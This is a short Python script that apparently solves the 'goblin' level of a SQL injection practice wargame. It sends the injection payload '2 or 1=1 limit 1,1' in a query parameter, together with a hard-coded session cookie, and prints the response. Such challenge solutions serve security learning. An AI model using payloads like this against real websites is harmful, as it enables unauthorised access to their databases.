import requests

cookies = {"PHPSESSID": "p2tucjmoqghg78656vgmf7g03p"}

url = "https://los.rubiya.kr/chall/goblin_e5afb87a6716708e3af46a849517afdc.php"
params = {"no": "2 or 1=1 limit 1,1"}

r = requests.get(url, params=params, cookies=cookies)
print(r.text)